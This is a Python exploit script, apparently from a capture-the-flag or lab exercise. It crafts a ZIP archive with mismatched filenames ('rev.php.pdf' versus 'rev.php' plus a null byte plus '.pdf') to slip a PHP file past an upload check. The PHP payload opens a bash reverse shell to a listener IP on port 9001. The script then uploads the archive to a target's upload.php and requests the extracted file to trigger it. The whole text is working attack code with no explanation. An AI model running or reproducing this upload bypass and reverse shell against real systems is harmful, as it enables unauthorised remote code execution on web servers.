from struct import pack
import argparse
import zlib
import requests

parser = argparse.ArgumentParser(description='Exploit Zipper')
parser.add_argument('-L', '--listener_ip', help='listener ip')
parser.add_argument('-R', '--target_ip', help='target ip')
args = parser.parse_args()

filename1 = b'rev.php.pdf'
filename2 = b'rev.php\x00.pdf'

filecontent = b"""<?php system("bash -c 'bash -i >& /dev/tcp/"""+args.listener_ip.encode()+b"""/9001 0>&1'"); ?>"""
length = len(filecontent)
crc = zlib.crc32(filecontent)


p  = b''
p += b'\x50\x4b\x03\x04' # magic bytes
p += b'\x14\x00' # version
p += b'\x00\x00' # flags
p += b'\x00\x00' # compression
p += b'\x48\xb9' # modtime
p += b'\x1b\x57' # moddate
p += pack("<L", crc) # crc
p += pack("<L", length) # compressed size
p += pack("<L", length) # uncompressed size
p += pack("<H", len(filename1)) # filename len
p += b'\x00\x00' # extra field len
p += filename1
p += filecontent

# central directory
cd  = b''
cd += b'\x50\x4b\x01\x02' # magic bytes
cd += b'\x14\x03' # version
cd += b'\x14\x00' # version needed
cd += b'\x00\x00' # flags
cd += b'\x00\x00' # compression
cd += b'\x48\xb9' # modtime
cd += b'\x1b\x57' # moddate
cd += pack("<L", crc) # crc
cd += pack("<L", length) # compressed size
cd += pack("<L", length) # uncompressed size
cd += pack("<H", len(filename2)) # filename len
cd += b'\x00\x00' # extra field len
cd += b'\x00\x00' # file comm. len
cd += b'\x00\x00' # disk start
cd += b'\x00\x00' # internal attr.
cd += b'\x00\x00\xA4\x81' # external attr
cd += b'\x00\x00\x00\x00' # offset of local header
cd += filename2

# end of centryl directory record
ecd  = b''
ecd += b'\x50\x4b\x05\x06' # magic bytes
ecd += b'\x00\x00' # disk number
ecd += b'\x00\x00' # disc # w/cd
ecd += b'\x01\x00' # disc entries
ecd += b'\x01\x00' # total entries
ecd += pack("<L", len(cd)) # central directory size
ecd += pack("<L", len(p))
ecd += b'\x00\x00'

f = open("rev.zip", "wb")
f.write(p+cd+ecd)
f.close()

url = "http://{}/upload.php".format(args.target_ip)
headers = {"Content-Type":'multipart/form-data'}
files = {'submit':(None,''),'zipFile':('rev.zip',p+cd+ecd)}
resp = requests.post(url, files=files)

for line in resp.text.split('\n'):
    if 'uploads' in line:
        requests.get("http://{}/{}".format(args.target_ip,line.split('"')[1].split(" ")[0]))
        exit(0)
